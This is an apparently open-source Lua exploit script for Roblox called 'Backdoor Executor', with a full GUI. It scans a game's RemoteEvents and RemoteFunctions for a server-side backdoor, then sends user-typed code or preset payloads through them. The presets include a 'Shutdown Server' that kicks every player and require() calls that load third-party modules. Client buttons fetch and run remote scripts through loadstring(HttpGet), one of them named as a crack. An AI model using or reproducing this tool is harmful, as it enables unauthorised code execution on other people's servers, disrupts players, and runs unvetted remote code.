-- Open Source

local Players = game:GetService("Players")

local StarterGui = game:GetService("StarterGui")

local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

local player = Players.LocalPlayer

local displayName = Players.LocalPlayer.DisplayName



local selectedColor = Color3.fromRGB(60, 60, 60)

local unselectedColor = Color3.fromRGB(30, 30, 30)

local tabButtons = {}



local function FireButtonClickSound()

local sound = Instance.new("Sound")



sound.SoundId = "rbxassetid://6042053626"

sound.Volume = 1

sound.Name = "ButtonClickSound"

sound.Parent = workspace

sound:Play()

end



local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

ScreenGui.Name = "BackdoorExecutor"

ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



local MainFrame = Instance.new("Frame", ScreenGui)

MainFrame.Size = UDim2.new(0, 550, 0, 300)

MainFrame.Position = UDim2.new(0.5, 0, 0.5, -175)

MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

MainFrame.BorderSizePixel = 0

MainFrame.AnchorPoint = Vector2.new(0.5, 0)

MainFrame.Active = true

MainFrame.Draggable = true

Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

local FloatButton = Instance.new("ImageButton", ScreenGui)

FloatButton.Name = "FloatToggleButton"

FloatButton.Size = UDim2.new(0, 50, 0, 50)

FloatButton.Position = UDim2.new(1, -60, 0, 50)

FloatButton.AnchorPoint = Vector2.new(1, 0)

FloatButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

FloatButton.BackgroundTransparency = 0.3

FloatButton.BorderSizePixel = 0

FloatButton.AutoButtonColor = true

FloatButton.Image = "rbxassetid://73002885569080"

FloatButton.Active = true

FloatButton.Draggable = true

Instance.new("UICorner", FloatButton).CornerRadius = UDim.new(0, 8)



local menuVisible = true

FloatButton.MouseButton1Click:Connect(function()

menuVisible = not menuVisible

MainFrame.Visible = menuVisible

FireButtonClickSound()

end)



local TabBar = Instance.new("Frame", MainFrame)

TabBar.Size = UDim2.new(0, 50, 1, 0)

TabBar.Position = UDim2.new(0, 0, 0, 0)

TabBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 10)



local StatusIndicator = Instance.new("Frame")
StatusIndicator.Name = "StatusIndicator"
StatusIndicator.Size = UDim2.new(0, 12, 0, 12)
StatusIndicator.AnchorPoint = Vector2.new(0.5, 1)
StatusIndicator.Position = UDim2.new(0.5, 0, 1, -15)
StatusIndicator.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
StatusIndicator.BorderSizePixel = 0
StatusIndicator.ZIndex = 99999
Instance.new("UICorner", StatusIndicator).CornerRadius = UDim.new(1, 0)
StatusIndicator.Parent = TabBar

local Divider = Instance.new("Frame", MainFrame)

Divider.Size = UDim2.new(0, 1, 1, 0)

Divider.Position = UDim2.new(0, 50, 0, 0)

Divider.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

Divider.BorderSizePixel = 0



local DividerAboveClearLogs = Instance.new("Frame", MainFrame)

DividerAboveClearLogs.Size = UDim2.new(1, -51, 0, 1)

DividerAboveClearLogs.Position = UDim2.new(0, 51, 1, -45)

DividerAboveClearLogs.AnchorPoint = Vector2.new(0, 1)

DividerAboveClearLogs.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

DividerAboveClearLogs.BorderSizePixel = 0

DividerAboveClearLogs.Visible = false



local TweenService = game:GetService("TweenService")



local ContentFrame = Instance.new("Frame", MainFrame)

ContentFrame.Size = UDim2.new(1, -51, 1, 0)

ContentFrame.Position = UDim2.new(0, 51, 0, 0)

ContentFrame.BackgroundTransparency = 1



local Title = Instance.new("TextLabel", ContentFrame)

Title.Size = UDim2.new(1, -90, 0, 40)

Title.Position = UDim2.new(0, 10, 0, 0)

Title.BackgroundTransparency = 1

Title.Text = " Backdoor Executor"

Title.Font = Enum.Font.GothamBold

Title.TextSize = 24

Title.TextColor3 = Color3.fromRGB(255, 255, 255)

Title.TextXAlignment = Enum.TextXAlignment.Left

local originalTitlePos = Title.Position



local CloseButton = Instance.new("TextButton", ContentFrame)

CloseButton.Size = UDim2.new(0, 30, 0, 30)

CloseButton.Position = UDim2.new(1, -35, 0, 5)

CloseButton.BackgroundTransparency = 1

CloseButton.Text = "X"

CloseButton.Font = Enum.Font.GothamBold

CloseButton.TextSize = 20

CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)



CloseButton.MouseButton1Click:Connect(function()

    FireButtonClickSound()

    ScreenGui:Destroy()



    if _G.ActiveNotifications then

        for _, notif in ipairs(_G.ActiveNotifications) do

            if notif and notif.Parent then

                notif:Destroy()

            end

        end

        table.clear(_G.ActiveNotifications)

    end



    if _G.NotificationGui and _G.NotificationGui.Parent then

        _G.NotificationGui:Destroy()

        _G.NotificationGui = nil

    end

end)



local MinimizeButton = Instance.new("TextButton", ContentFrame)

MinimizeButton.Size = UDim2.new(0, 30, 0, 30)

MinimizeButton.Position = UDim2.new(1, -70, 0, 5)

MinimizeButton.BackgroundTransparency = 1

MinimizeButton.Text = "—"

MinimizeButton.Font = Enum.Font.GothamBold

MinimizeButton.TextSize = 24

MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)



local originalSize = MainFrame.Size

local minimized = false

local originalVisibility = {}



local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local minimizedSize = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 40)

local minimizedTitlePos = UDim2.new(0, -ContentFrame.Position.X.Offset + 5, 0, 0)



MinimizeButton.MouseButton1Click:Connect(function()

minimized = not minimized



if minimized then  

	for _, obj in pairs(ContentFrame:GetChildren()) do  

		if obj:IsA("GuiObject") and obj ~= Title and obj ~= MinimizeButton and obj ~= CloseButton then  

			originalVisibility[obj] = obj.Visible  

			obj.Visible = false  

		end  

	end  

	originalVisibility[TabBar] = TabBar.Visible  

	originalVisibility[Divider] = Divider.Visible  

	TabBar.Visible = false  

	Divider.Visible = false  

	DividerAboveClearLogs.Visible = false

	StatusIndicator.Visible = false


	TweenService:Create(MainFrame, tweenInfo, {Size = minimizedSize}):Play()  

	TweenService:Create(Title, tweenInfo, {Position = minimizedTitlePos}):Play()  



	MinimizeButton.Text = "+"  

	FireButtonClickSound()  

else
	for obj, wasVisible in pairs(originalVisibility) do  

		if obj and obj.Parent then  

			obj.Visible = wasVisible  

		end  

	end  


   StatusIndicator.Visible = true
	TweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()  

	TweenService:Create(Title, tweenInfo, {Position = originalTitlePos}):Play()  



	MinimizeButton.Text = "—"  

	FireButtonClickSound()  

  end

end)



local TextBox = Instance.new("TextBox", ContentFrame)

TextBox.Position = UDim2.new(0.05, 0, 0.2, 0)

TextBox.Size = UDim2.new(0.9, 0, 0.5, 0)

TextBox.PlaceholderText = 'Enter a Code Here!'

TextBox.Text = ""

TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)

TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

TextBox.ClearTextOnFocus = false

TextBox.TextWrapped = true

TextBox.TextXAlignment = Enum.TextXAlignment.Left

TextBox.TextYAlignment = Enum.TextYAlignment.Top

TextBox.Font = Enum.Font.Code

TextBox.TextSize = 16

TextBox.MultiLine = true

Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 8)



local function createButton(text, position)

local button = Instance.new("TextButton", ContentFrame)

button.Size = UDim2.new(0.4, 0, 0, 35)

button.Position = position

button.Text = text

button.Font = Enum.Font.GothamMedium

button.TextSize = 16

button.TextColor3 = Color3.fromRGB(255, 255, 255)

button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)

return button

end



local ExecuteButton = createButton(" Execute", UDim2.new(0.05, 0, 0.78, 0))

local ClearButton = createButton(" Clear", UDim2.new(0.55, 0, 0.78, 0))



local lugares = {

game:GetService("Workspace"), game:GetService("Lighting"),

game:GetService("ReplicatedStorage"), game:GetService("StarterGui"),

game:GetService("StarterPlayer"), game:GetService("StarterPack"),

game:GetService("Players"), game:GetService("Teams"),

game:GetService("Chat"), game:GetService("SoundService"),

game:GetService("CoreGui")

}



local CoreGui = game:GetService("CoreGui")

local TweenService = game:GetService("TweenService")



_G.NotificationGui = _G.NotificationGui or Instance.new("ScreenGui")

_G.NotificationGui.Name = "NotificationGui"

_G.NotificationGui.ResetOnSpawn = false

_G.NotificationGui.IgnoreGuiInset = true

_G.NotificationGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

_G.NotificationGui.Parent = CoreGui



_G.ActiveNotifications = _G.ActiveNotifications or {}



function notifyY(title, text)

	local sound = Instance.new("Sound")

	sound.SoundId = "rbxassetid://17208361335"

	sound.Volume = 1

	sound.Name = "ButtonClickSound"

	sound.Parent = workspace

	sound:Play()



	local spacing = 10  

	local finalY = 197  

	for _, notif in ipairs(_G.ActiveNotifications) do  

		finalY = finalY - (notif.Size.Y.Offset + spacing)  

	end  



	local frame = Instance.new("Frame")

	frame.Name = "NotificationFrame"

	local textLength = string.len(text or "")

	local numLines = math.ceil(textLength / 35)

	local extraHeight = numLines * 20

	local frameHeight = 70 + extraHeight

	frame.Size = UDim2.new(0, 250, 0, frameHeight)

	frame.AnchorPoint = Vector2.new(0.5, 1)

	frame.Position = UDim2.new(1.5, 0, 0.5, finalY)

	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

	frame.BorderSizePixel = 0

	frame.ZIndex = 99999

	frame.Parent = _G.NotificationGui



	table.insert(_G.ActiveNotifications, 1, frame)



	frame:TweenPosition(

		UDim2.new(0.5, 296, 0.5, finalY),

		Enum.EasingDirection.Out,

		Enum.EasingStyle.Quad,

		0.4,

		true

	)



	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)



	local titleLabel = Instance.new("TextLabel", frame)

	titleLabel.Text = title or "Notification"

	titleLabel.Font = Enum.Font.GothamBold

	titleLabel.TextSize = 22

	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

	titleLabel.BackgroundTransparency = 1

	titleLabel.Position = UDim2.new(0, 10, 0, 5)

	titleLabel.Size = UDim2.new(1, -30, 0, 25)

	titleLabel.TextXAlignment = Enum.TextXAlignment.Left

	titleLabel.ZIndex = 99999



	local descLabel = Instance.new("TextLabel", frame)

	descLabel.Text = text or ""

	descLabel.Font = Enum.Font.Gotham

	descLabel.TextSize = 16

	descLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

	descLabel.BackgroundTransparency = 1

	descLabel.Position = UDim2.new(0, 10, 0, 35)

	descLabel.Size = UDim2.new(1, -20, 0, extraHeight)

	descLabel.TextXAlignment = Enum.TextXAlignment.Left

	descLabel.TextYAlignment = Enum.TextYAlignment.Top

	descLabel.TextWrapped = true

	descLabel.ZIndex = 99999



	local closeBtn = Instance.new("TextButton", frame)

	closeBtn.Text = "X"

	closeBtn.Font = Enum.Font.GothamBold

	closeBtn.TextSize = 18

	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

	closeBtn.BackgroundTransparency = 1

	closeBtn.Size = UDim2.new(0, 30, 0, 30)

	closeBtn.Position = UDim2.new(1, -30, 0, 0)

	closeBtn.AutoButtonColor = false

	closeBtn.ZIndex = 99999



	local bar = Instance.new("Frame", frame)

	bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

	bar.BorderSizePixel = 0

	bar.Position = UDim2.new(0, 10, 1, -10)

	bar.Size = UDim2.new(0, 0, 0, 6)

	bar.ZIndex = 99999

	Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)



	local gradient = Instance.new("UIGradient")  

	gradient.Color = ColorSequence.new({  

		ColorSequenceKeypoint.new(0, Color3.fromRGB(75, 171, 255)),  

		ColorSequenceKeypoint.new(1, Color3.fromRGB(19, 230, 251))  

	})  

	gradient.Rotation = 0  

	gradient.Parent = bar  



	local progressTween = TweenService:Create(bar, TweenInfo.new(3, Enum.EasingStyle.Linear), {

		Size = UDim2.new(1, -20, 0, 6)

	})

	progressTween:Play()



	local function reorganizeNotifications()

		local spacing = 10

		local yPos = 197

		for _, notif in ipairs(_G.ActiveNotifications) do

			TweenService:Create(notif, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {

				Position = UDim2.new(0.5, 296, 0.5, yPos)

			}):Play()

			yPos = yPos - (notif.Size.Y.Offset + spacing)

		end

	end



	local function removeNotification()

		for i, notif in ipairs(_G.ActiveNotifications) do

			if notif == frame then

				table.remove(_G.ActiveNotifications, i)

				break

			end

		end



		if frame and frame.Parent then

			frame:TweenPosition(

				UDim2.new(1.5, 0, 0.5, frame.Position.Y.Offset),

				Enum.EasingDirection.Out,

				Enum.EasingStyle.Quad,

				0.4,

				true,

				function()

					if frame and frame.Parent then

						frame:Destroy()

						reorganizeNotifications()

					end

				end

			)

		else

			if frame then frame:Destroy() end

			reorganizeNotifications()

		end

	end



	progressTween.Completed:Connect(removeNotification)

	closeBtn.MouseButton1Click:Connect(removeNotification)

end



local ConsolePanel = Instance.new("ScrollingFrame", ContentFrame)

ConsolePanel.Size = UDim2.new(1, -20, 0.6, 0)

ConsolePanel.Position = UDim2.new(0, 10, 0.25, 0)

ConsolePanel.Visible = false

ConsolePanel.BackgroundTransparency = 1

ConsolePanel.ScrollBarThickness = 4

ConsolePanel.CanvasSize = UDim2.new(0, 0, 0, 0)

ConsolePanel.AutomaticCanvasSize = Enum.AutomaticSize.Y



local ConsoleLayout = Instance.new("UIListLayout", ConsolePanel)

ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder

ConsoleLayout.Padding = UDim.new(0, 2)



local function getTimestamp()

	local now = os.date("*t")

	return string.format("[%02d:%02d:%02d]", now.hour, now.min, now.sec)

end



local function logToConsole(prefix, text, color)

	local label = Instance.new("TextLabel", ConsolePanel)

	label.Text = string.format("%s [%s] %s", getTimestamp(), prefix, text)

	label.TextColor3 = color or Color3.fromRGB(255, 255, 255)

	label.Font = Enum.Font.Code

	label.TextSize = 16

	label.TextXAlignment = Enum.TextXAlignment.Left

	label.BackgroundTransparency = 1

	label.Size = UDim2.new(1, -10, 0, 20)

end



local buttonCache = {}



local function animateClick(button)

if not buttonCache[button] then

buttonCache[button] = {

Position = button.Position,

Size = button.Size

}

end



local original = buttonCache[button]    



local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {    

	Position = original.Position + UDim2.new(0, 0, 0, 2),    

	Size = original.Size - UDim2.new(0, 0, 0, 2)    

})    



local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {    

	Position = original.Position,    

	Size = original.Size    

})    



pressTween:Play()    

pressTween.Completed:Connect(function()    

	releaseTween:Play()    

  end)

end



local ClearLogsButton = Instance.new("TextButton", ContentFrame)

ClearLogsButton.Size = UDim2.new(0, 100, 0, 30)

ClearLogsButton.Position = UDim2.new(0, 5, 1, -10)

ClearLogsButton.AnchorPoint = Vector2.new(0, 1)

ClearLogsButton.Text = "Clear Logs"

ClearLogsButton.Font = Enum.Font.GothamMedium

ClearLogsButton.TextSize = 14

ClearLogsButton.TextColor3 = Color3.fromRGB(255, 255, 255)

ClearLogsButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

ClearLogsButton.Visible = false

Instance.new("UICorner", ClearLogsButton).CornerRadius = UDim.new(0, 6)



ClearLogsButton.MouseButton1Click:Connect(function()

    animateClick(ClearLogsButton)

	FireButtonClickSound()

	notifyY("Success", "Successfully Cleared")



	for _, obj in pairs(ConsolePanel:GetChildren()) do

		if obj:IsA("TextLabel") then

			obj:Destroy()

		end

	end

end)



ExecuteButton.MouseButton1Click:Connect(function()

    FireButtonClickSound()

    animateClick(ExecuteButton)



    local code = TextBox.Text

    if code == "" then

        notifyY("Error", "No code provided")

        logToConsole("ERROR", "No code provided", Color3.fromRGB(255, 100, 100))

        return

    end



    local enviados = 0

    for _, localBase in ipairs(lugares) do

        for _, obj in ipairs(localBase:GetDescendants()) do

            if obj:IsA("RemoteEvent") then

                pcall(function()

                    obj:FireServer(code)

                    enviados += 1

                end)

            elseif obj:IsA("RemoteFunction") then

                pcall(function()

                    obj:InvokeServer(code)

                    enviados += 1

                end)

            end

        end

    end



    if enviados > 0 then

        logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))

        notifyY("Success", "Successfully executed")

    end

end)



ClearButton.MouseButton1Click:Connect(function()

FireButtonClickSound()

animateClick(ClearButton)

TextBox.Text = ""

notifyY("Success", "Successfully Cleared")

logToConsole("INFO", "Textbox Cleared", Color3.fromRGB(255, 255, 255))

end)



local ScriptPanel = Instance.new("ScrollingFrame", ContentFrame)

ScriptPanel.Size = UDim2.new(1, -20, 0.7, 0)

ScriptPanel.Position = UDim2.new(0, 10, 0.2, 0)

ScriptPanel.Name = "ScriptPanel"

ScriptPanel.Visible = false

ScriptPanel.BackgroundTransparency = 1

ScriptPanel.ScrollBarThickness = 4

ScriptPanel.CanvasSize = UDim2.new(0, 0, 0, 0)

ScriptPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y

ScriptPanel.ClipsDescendants = true



local ScriptLayout = Instance.new("UIListLayout", ScriptPanel)

ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder

ScriptLayout.Padding = UDim.new(0, 5)



local ParagraphPanel = Instance.new("ScrollingFrame", ContentFrame)

ParagraphPanel.Size = UDim2.new(1, -20, 0.7, 0)

ParagraphPanel.Position = UDim2.new(0, 10, 0.2, 0)

ParagraphPanel.Name = "ParagraphPanel"

ParagraphPanel.Visible = false

ParagraphPanel.BackgroundTransparency = 1

ParagraphPanel.ScrollBarThickness = 4

ParagraphPanel.CanvasSize = UDim2.new(0, 0, 0, 0)

ParagraphPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y



local ParagraphLayout = Instance.new("UIListLayout", ParagraphPanel)

ParagraphLayout.SortOrder = Enum.SortOrder.LayoutOrder

ParagraphLayout.Padding = UDim.new(0, 10)



local function SetActiveTab(tab)

	TextBox.Visible = false

	ExecuteButton.Visible = false

	ClearButton.Visible = false

	ScriptPanel.Visible = false

	ConsolePanel.Visible = false

	ParagraphPanel.Visible = false



	for name, button in pairs(tabButtons) do

		if button then

			button.BackgroundColor3 = (name == tab) and selectedColor or unselectedColor

		end

	end

	

	if tab == "executor" then  

		TextBox.Visible = true  

		ExecuteButton.Visible = true  

		ClearButton.Visible = true  

	elseif tab == "scripts" then  

		ScriptPanel.Visible = true  

	elseif tab == "console" then

		ConsolePanel.Visible = true

		ClearLogsButton.Visible = true

	elseif tab == "paragraphs" then

		ParagraphPanel.Visible = true

	end

	

	ClearLogsButton.Visible = (tab == "console")

	DividerAboveClearLogs.Visible = (tab == "console")

	FireButtonClickSound()

end



local TweenService = game:GetService("TweenService")



local buttonCache = {}



local function animateClick(button)

if not buttonCache[button] then

buttonCache[button] = {

Position = button.Position,

Size = button.Size

}

end



local original = buttonCache[button]    



local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {    

	Position = original.Position + UDim2.new(0, 0, 0, 2),    

	Size = original.Size - UDim2.new(0, 0, 0, 2)    

})    



local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {    

	Position = original.Position,    

	Size = original.Size    

})    



pressTween:Play()    

pressTween.Completed:Connect(function()    

	releaseTween:Play()    

  end)

end



_G.AddSection = function(text)

local label = Instance.new("TextLabel", ScriptPanel)

label.Size = UDim2.new(1, 0, 0, 25)

label.Text = text

label.Font = Enum.Font.GothamBold

label.TextSize = 18

label.TextColor3 = Color3.fromRGB(255, 255, 255)

label.BackgroundTransparency = 1

end



_G.AddButton = function(text, code)

local button = Instance.new("TextButton", ScriptPanel)

button.Size = UDim2.new(1, 0, 0, 30)

button.Text = text

button.Font = Enum.Font.Gotham

button.TextSize = 16

button.TextColor3 = Color3.fromRGB(255, 255, 255)

button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)



button.MouseButton1Click:Connect(function()  

	SetActiveTab("executor")  

	TextBox.Text = code  

  end)

end



_G.LocalScriptButton = function(text, func)

local button = Instance.new("TextButton", ScriptPanel)

button.Size = UDim2.new(1, 0, 0, 30)

button.Text = text

button.Font = Enum.Font.Gotham

button.TextSize = 16

button.TextColor3 = Color3.fromRGB(255, 255, 255)

button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)



button.MouseButton1Click:Connect(function()  

    logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))

    notifyY("Success", "Successfully executed")

	FireButtonClickSound()  

	animateClick(button)

	func()

  end)

end



local function createTabButton(order, tabName, callback, imageId)

	local tab = Instance.new("ImageButton", TabBar)

	tab.Size = UDim2.new(1, 0, 0, 50)

	tab.Position = UDim2.new(0, 0, 0, order * 50)

	tab.Image = "rbxassetid://" .. imageId

	tab.BackgroundColor3 = unselectedColor

	tab.AutoButtonColor = false

	tab.Name = tabName



    local corner = Instance.new("UICorner", tab)

    corner.CornerRadius = UDim.new(0, 8)



	tab.MouseButton1Click:Connect(function()

		SetActiveTab(tabName)

		callback()

	end)



	tabButtons[tabName] = tab

end



_G.AddParagraph = function(title, description)

	local container = Instance.new("Frame", ParagraphPanel)

	container.Size = UDim2.new(1, 0, 0, 0)

	container.AutomaticSize = Enum.AutomaticSize.Y

	container.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	container.BorderSizePixel = 0

	container.LayoutOrder = #ParagraphPanel:GetChildren()

	Instance.new("UICorner", container).CornerRadius = UDim.new(0, 6)



	local padding = Instance.new("UIPadding", container)

	padding.PaddingBottom = UDim.new(0, 10)

	padding.PaddingLeft = UDim.new(0, 10)

	padding.PaddingRight = UDim.new(0, 10)

	padding.PaddingTop = UDim.new(0, 5)



	local titleLabel = Instance.new("TextLabel", container)

	titleLabel.Size = UDim2.new(1, 0, 0, 22)

	titleLabel.Text = title

	titleLabel.Font = Enum.Font.GothamBold

	titleLabel.TextSize = 20

	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

	titleLabel.BackgroundTransparency = 1

	titleLabel.TextXAlignment = Enum.TextXAlignment.Left



	local descLabel = Instance.new("TextLabel", container)

	descLabel.Size = UDim2.new(1, 0, 0, 0)

	descLabel.AutomaticSize = Enum.AutomaticSize.Y

	descLabel.Text = description

	descLabel.Font = Enum.Font.SourceSans

	descLabel.TextSize = 18

	descLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

	descLabel.BackgroundTransparency = 1

	descLabel.TextWrapped = true

	descLabel.TextXAlignment = Enum.TextXAlignment.Left

	descLabel.Position = UDim2.new(0, 0, 0, 28)

end



createTabButton(0, "executor", function() end, 133432695793267)

createTabButton(1, "scripts", function() end, 91156715735899)

createTabButton(2, "console", function() end, 72275937634892)

createTabButton(3, "paragraphs", function() end, 92524141452897)



SetActiveTab("executor")



_G.AddSection("Server Side Scripts")



_G.AddButton("Sensation Hub", 'require(100263845596551)("'..LocalPlayer.Name..'", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")')



_G.AddButton("R6 Convert", 'require(3436957371):r6("' .. LocalPlayer.Name .. '")')



_G.AddButton("Respawn Character", 'game.Players["'..LocalPlayer.Name..'"]:LoadCharacter()')



_G.AddButton("Grab Knife V4 (R6 Only)", 'require(18665717275).load("' .. LocalPlayer.Name .. '")')



_G.AddButton("Rainbow Stand (R6 Only)", 'require(5098731275).eliza("' .. LocalPlayer.Name .. '")')



_G.AddButton("C4 Bomb", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')



_G.AddButton("Shutdown Server", [[

for _, v in pairs(game.Players:GetPlayers()) do

v:Kick("Server has Shutdown")

end

]])



_G.AddButton("Hint", [[

Instance.new("Hint", workspace).Text = "Text Here"

]])



_G.AddSection("Client Side Scripts")



_G.LocalScriptButton("Infinite Yield", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

end)



_G.LocalScriptButton("Fly GUI V3", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()

end)



_G.LocalScriptButton("Keyboard", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()

end)



_G.AddParagraph("Credits", "Script created by Conta Teste (Scripted and Design) ")



logToConsole("WELCOME", "Welcome to Console!", Color3.fromRGB(0, 255, 255))

notifyY("Welcome", "Hello " .. displayName .. ". Welcome to Backdoor Executor!")

local function ScanBackdoor()
    local lugares2 = {
        game:GetService("Workspace"),
        game:GetService("Lighting"),
        game:GetService("ReplicatedStorage"),
        game:GetService("StarterGui"),
        game:GetService("StarterPlayer"),
        game:GetService("StarterPack"),
        game:GetService("Players"),
        game:GetService("Teams"),
        game:GetService("Chat"),
        game:GetService("SoundService"),
        pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or nil,
    }

    local startTime = tick()

    local charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local function randomString(length)
        local result = ""
        for i = 1, length do
            local rand = math.random(1, #charset)
            result = result .. charset:sub(rand, rand)
        end
        return result
    end

    local codigoAleatorio = "Scanning... " .. randomString(16)

    local hintCode = string.format([[Instance.new("Hint", workspace).Text = "%s"]], codigoAleatorio)

    local destroyHintCode = string.format([[
        for i = #workspace:GetChildren(), 1, -1 do
            local obj = workspace:GetChildren()[i]
            if obj.ClassName == "Hint" and obj.Text == "%s" then
                obj:Destroy()
            end
        end
    ]], codigoAleatorio)

    local enviados = 0
    for _, localBase in ipairs(lugares2) do
        if localBase then
            for _, obj in ipairs(localBase:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    pcall(function()
                        obj:FireServer(hintCode)
                        enviados += 1
                    end)
                elseif obj:IsA("RemoteFunction") then
                    pcall(function()
                        obj:InvokeServer(hintCode)
                        enviados += 1
                    end)
                end
            end
        end
    end

    logToConsole("SCANNING", "Scanning for backdoors...", Color3.fromRGB(255, 255, 0))

    task.delay(1, function()
        local found = false
        for _, obj in ipairs(workspace:GetChildren()) do
            if obj.ClassName == "Hint" and obj.Text == codigoAleatorio then
                found = true
                break
            end
        end

        local elapsed = tick() - startTime

        if found then
            logToConsole("SUCCESS", string.format("Backdoor Found! %.8f", elapsed), Color3.fromRGB(100, 255, 100))
            StatusIndicator.BackgroundColor3 = Color3.fromRGB(100, 255, 100)

            for _, localBase in ipairs(lugares2) do
                if localBase then
                    for _, obj in ipairs(localBase:GetDescendants()) do
                        if obj:IsA("RemoteEvent") then
                            pcall(function()
                                obj:FireServer(destroyHintCode)
                            end)
                        elseif obj:IsA("RemoteFunction") then
                            pcall(function()
                                obj:InvokeServer(destroyHintCode)
                            end)
                        end
                    end
                end
            end
        else
            logToConsole("ERROR", string.format("Backdoor not found! %.8f", elapsed), Color3.fromRGB(255, 100, 100))
            StatusIndicator.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        end
    end)
end

ScanBackdoor()
